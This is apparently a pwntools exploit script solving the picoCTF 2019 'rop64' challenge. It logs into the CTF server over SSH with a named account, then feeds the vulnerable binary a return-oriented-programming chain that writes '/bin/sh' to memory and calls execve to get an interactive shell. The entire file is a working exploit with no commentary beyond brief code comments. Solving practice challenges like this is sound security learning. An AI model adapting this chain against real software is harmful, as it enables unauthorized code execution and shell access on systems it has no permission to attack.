#!/usr/bin/env python3
from pwn import *
context(arch='amd64', kernel='amd64', terminal=['tmux', 'neww'])
remote = ssh('afcidk', '2019shell1.picoctf.com', password="pass.....")
remote.set_working_directory(
    b'/problems/rop64_5_7608f52be26a84e5625c50ba7adb22e0')

r = remote.process('./vuln')
rop = ROP('./vuln')
#gdb.attach(r)
rax = 59  # execev
writable_addr = 0x6b6000
syscall = 0x40123c
pop_rdx_rsi = 0x44bf39
pop_rdi = 0x400686
pop_rax = 0x4156f4
pop_rdx = 0x4499b5
mov_rdx_prax = 0x48d341

# Offset
payload = cyclic(24)
# Write "/bin/sh" to writable address
payload += p64(pop_rdx) + b"/bin/sh\x00"
payload += p64(pop_rax) + p64(writable_addr)
payload += p64(mov_rdx_prax)

# execev(rdi, rsi, rdx) = execve(writable, 0, 0)
payload += p64(pop_rax) + p64(rax)
payload += p64(pop_rdi) + p64(writable_addr)
payload += p64(pop_rdx_rsi) + p64(0) * 2
payload += p64(syscall)

r.sendline(payload)
r.interactive()
